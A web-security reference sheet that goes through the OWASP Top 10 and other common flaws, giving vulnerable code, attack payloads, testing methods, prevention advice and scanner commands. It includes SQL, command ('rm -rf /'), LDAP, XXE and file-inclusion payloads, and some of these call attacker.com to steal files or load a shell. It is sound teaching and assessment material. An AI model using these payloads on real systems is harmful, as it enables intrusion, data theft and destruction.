# Common Vulnerabilities Reference

## OWASP Top 10 (2021)

### A01: Broken Access Control
**What it is**: Restrictions on authenticated users are not properly enforced

**Common Examples**:
```bash
# URL manipulation
https://app.com/admin/users  # Should require admin role
https://app.com/user/123     # Should only allow access to own profile

# Parameter tampering
POST /transfer
{
  "from_account": "123456",   # Attacker changes this
  "to_account": "789012",
  "amount": 1000
}

# Force browsing to unauthorized pages
https://app.com/admin/config
https://app.com/backup/database.sql
```

**Testing Methods**:
- Try accessing admin panels without authentication
- Modify URL parameters (user IDs, account numbers)
- Test different HTTP methods (GET vs POST)
- Try accessing direct file URLs

**Prevention**:
- Implement proper authorization checks
- Use deny by default access control
- Log access control failures
- Rate limit API calls

### A02: Cryptographic Failures
**What it is**: Failures related to cryptography that lead to sensitive data exposure

**Common Examples**:
```python
# Weak hashing
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()  # BAD: MD5 is broken

# No encryption of sensitive data
database.execute("INSERT INTO users (name, ssn) VALUES (?, ?)", name, ssn)  # SSN in plaintext

# Hardcoded keys
encryption_key = "12345678901234567890123456789012"  # BAD: Hardcoded key

# Weak random number generation
import random
session_id = random.randint(100000, 999999)  # BAD: Predictable
```

**Testing Methods**:
- Check for HTTP instead of HTTPS
- Look for hardcoded cryptographic keys in source code
- Test for weak password hashing (MD5, SHA1)
- Analyze certificate configuration

**Prevention**:
- Use HTTPS everywhere
- Use strong, standard encryption algorithms
- Implement proper key management
- Use cryptographically secure random number generators

### A03: Injection
**What it is**: Untrusted data sent to interpreter as part of command or query

#### SQL Injection
```sql
-- Vulnerable code (PHP)
$query = "SELECT * FROM users WHERE username = '$_POST[username]' AND password = '$_POST[password]'";

-- Attack payload
Username: admin'--
Password: anything

-- Resulting malicious query
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

#### Command Injection
```bash
# Vulnerable code (Python)
import subprocess
filename = request.form['filename']
subprocess.call(f"cat {filename}", shell=True)

# Attack payload
filename = "file.txt; rm -rf /"

# Resulting command
cat file.txt; rm -rf /
```

#### LDAP Injection
```bash
# Vulnerable query
(&(cn=*)(userPassword={user_input}))

# Attack payload
*)(cn=*))((|userPassword=*

# Resulting query (always true)
(&(cn=*)(userPassword=*)(cn=*))((|userPassword=*)
```

**Testing Methods**:
- Test all input fields with special characters: `' " ; & | < > ( ) { }`
- Use automated tools: sqlmap, NoSQLMap
- Try different injection contexts (WHERE, ORDER BY, INSERT)
- Test both error-based and blind injection

**Prevention**:
- Use parameterized queries/prepared statements
- Validate and sanitize all input
- Use stored procedures (if implemented safely)
- Escape special characters

### A04: Insecure Design
**What it is**: Missing or ineffective control design

**Common Examples**:
```bash
# Missing account lockout
- Unlimited login attempts allowed
- No rate limiting on authentication

# Insecure password recovery
- Security questions with easily guessable answers
- Password reset links that don't expire

# Missing business logic validation
- Negative quantities in shopping cart
- Privilege escalation through parameter manipulation
```

**Testing Methods**:
- Test business logic thoroughly
- Look for missing security controls
- Test edge cases and error conditions
- Analyze the threat model

### A05: Security Misconfiguration
**What it is**: Failure to implement secure configurations

**Common Examples**:
```bash
# Default credentials
admin:admin
admin:password
root:root

# Unnecessary services enabled
- Telnet service running
- FTP with anonymous access
- Debugging interfaces exposed

# Verbose error messages
SQL error: Table 'users' doesn't exist in database 'production_db'

# Directory listing enabled
Index of /uploads/
- confidential.pdf
- passwords.txt
- backup.zip
```

**Testing Methods**:
- Scan for default credentials
- Check for unnecessary services (nmap)
- Look for detailed error messages
- Test for directory traversal
- Check security headers

**Prevention**:
- Change default credentials
- Disable unused features and services
- Keep software updated
- Implement proper error handling
- Use security scanners regularly

### A06: Vulnerable and Outdated Components
**What it is**: Using components with known vulnerabilities

**Common Examples**:
```bash
# Outdated frameworks
jQuery 1.4.2 (vulnerable to XSS)
Apache Struts 2.x (RCE vulnerabilities)
Spring Framework (various CVEs)

# Vulnerable libraries
Log4j 2.x (Log4Shell RCE)
OpenSSL (Heartbleed)
ImageMagick (ImageTragick)
```

**Testing Methods**:
- Scan dependencies with tools like Dependabot, Snyk
- Check version numbers against CVE databases
- Use tools like OWASP Dependency Check
- Monitor security advisories

**Prevention**:
- Keep all components updated
- Remove unused dependencies
- Monitor vulnerability databases
- Use dependency scanning tools
- Subscribe to security mailing lists

### A07: Identification and Authentication Failures
**What it is**: Broken authentication and session management

**Common Examples**:
```python
# Weak password policy
if len(password) < 6:  # Too weak
    return "Password too short"

# No account lockout
login_attempts = 0
while True:
    if check_password(username, password):
        break
    login_attempts += 1  # No limit!

# Predictable session IDs
session_id = str(user_id) + str(int(time.time()))  # Predictable

# Session fixation vulnerability
if login_successful:
    # Should generate new session ID, but doesn't
    return redirect("/dashboard")
```

**Testing Methods**:
- Test password complexity requirements
- Check for account lockout mechanisms
- Analyze session ID randomness
- Test session management (fixation, hijacking)
- Try credential stuffing attacks

**Prevention**:
- Implement strong password policies
- Use multi-factor authentication
- Implement account lockout
- Generate secure session IDs
- Implement proper session timeout

### A08: Software and Data Integrity Failures
**What it is**: Software updates, critical data, or CI/CD pipelines without integrity verification

**Common Examples**:
```bash
# Unsigned software updates
curl http://untrusted-source.com/update.sh | bash

# No integrity checks on downloads
wget http://example.com/software.tar.gz
tar -xzf software.tar.gz  # No checksum verification

# Insecure CI/CD pipeline
# Build pulls from any GitHub repo without verification
```

**Testing Methods**:
- Check for code signing verification
- Look for checksum validation
- Analyze CI/CD pipeline security
- Test software update mechanisms

### A09: Security Logging and Monitoring Failures
**What it is**: Insufficient logging and monitoring

**Common Examples**:
```python
# No logging of security events
def login(username, password):
    if check_credentials(username, password):
        return "Login successful"
    else:
        return "Login failed"  # No logging!

# Logs stored insecurely
with open("/tmp/app.log", "a") as f:  # World-readable
    f.write(f"User {username} logged in\n")
```

**Testing Methods**:
- Check what events are logged
- Verify log storage security
- Test log tampering protection
- Analyze monitoring and alerting

### A10: Server-Side Request Forgery (SSRF)
**What it is**: Web application fetches remote resource without validating user-supplied URL

**Common Examples**:
```python
# Vulnerable code
import requests
url = request.form['url']
response = requests.get(url)  # No validation!

# Attack payloads
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://localhost:6379/  # Redis
file:///etc/passwd  # Local file access
http://internal-service.local/admin  # Internal network access
```

**Testing Methods**:
- Test with internal IP ranges (127.0.0.1, 192.168.x.x, 10.x.x.x)
- Try cloud metadata URLs
- Test different protocols (file://, ftp://, gopher://)
- Use tools like SSRFmap

**Prevention**:
- Validate and whitelist URLs
- Use allow lists for domains
- Disable redirects or validate redirect targets
- Network segmentation

## Additional Common Vulnerabilities

### XML External Entity (XXE)
```xml
<!-- Malicious XML -->
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>

<!-- More advanced XXE -->
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://attacker.com/steal.php?data=file:///etc/passwd">
]>
<test>&xxe;</test>
```

### Local File Inclusion (LFI)
```bash
# Vulnerable code
include($_GET['page']);

# Attack payloads
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

### Remote File Inclusion (RFI)
```bash
# Attack payload
?page=http://attacker.com/shell.php

# Resulting inclusion
include("http://attacker.com/shell.php");
```

### Directory Traversal
```bash
# Vulnerable file access
filename = request.args.get('file')
with open(f"/safe/directory/{filename}") as f:
    return f.read()

# Attack payloads
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
```

### Insecure Direct Object References (IDOR)
```bash
# Vulnerable URLs
https://app.com/user/profile?id=123  # Try different IDs
https://app.com/invoice/download/456  # Try different invoice IDs
https://app.com/api/user/789/details  # Try different user IDs

# Testing methodology
1. Identify all parameters that reference objects
2. Try sequential numbers (1, 2, 3...)
3. Try different user contexts
4. Check authorization for each object access
```

### Business Logic Vulnerabilities
```bash
# Price manipulation
quantity: -1  # Negative quantity for refund
price: 0.01   # Manipulated price

# Race conditions
# Multiple simultaneous requests to transfer money
# Can result in duplicate transactions

# Workflow bypass
# Skip payment step in checkout process
# Access admin functions without proper role
```

## Vulnerability Assessment Tools

### Web Application Scanners
```bash
# OWASP ZAP
zap-baseline.py -t https://target.com

# Nikto
nikto -h https://target.com

# Nuclei
nuclei -t cves/ -u https://target.com

# Burp Suite (Commercial)
# Professional web application testing platform
```

### Specialized Tools
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs

# XSS Detection
python3 XSStrike.py -u "http://target.com/search?q=test"

# Directory Brute Force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# SSL/TLS Testing
testssl.sh https://target.com
```

## Vulnerability Prioritization

### Risk Assessment Matrix
| Vulnerability | Likelihood | Impact | Risk Level |
|---------------|------------|--------|------------|
| SQL Injection | High | High | Critical |
| Stored XSS | Medium | High | High |
| CSRF | Medium | Medium | Medium |
| Info Disclosure | Low | Low | Low |

### CVSS (Common Vulnerability Scoring System)
```bash
# Base Score Components
Attack Vector: Network/Adjacent/Local/Physical
Attack Complexity: Low/High
Privileges Required: None/Low/High
User Interaction: None/Required
Scope: Unchanged/Changed
Impact: Confidentiality/Integrity/Availability (None/Low/High)

# Score Ranges
0.0: None
0.1-3.9: Low  
4.0-6.9: Medium
7.0-8.9: High
9.0-10.0: Critical
```

This vulnerability reference helps you understand what to look for during security assessments and how different attacks work.